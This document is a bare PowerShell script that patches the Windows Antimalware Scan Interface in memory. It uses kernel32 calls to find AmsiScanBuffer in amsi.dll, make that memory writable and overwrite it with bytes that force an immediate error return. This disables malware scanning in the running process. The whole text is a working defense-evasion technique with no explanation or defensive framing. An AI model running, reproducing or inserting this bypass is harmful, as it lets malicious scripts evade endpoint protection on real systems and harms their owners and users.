$w = @"
using System;
using System.Runtime.InteropServices;
public class W {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $w
$h = [W]::LoadLibrary("amsi.dll")
$p = [W]::GetProcAddress($h, "AmsiScanBuffer")
$o = 0
[W]::VirtualProtect($p, [UIntPtr]5, 0x40, [ref]$o)
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$p,6)
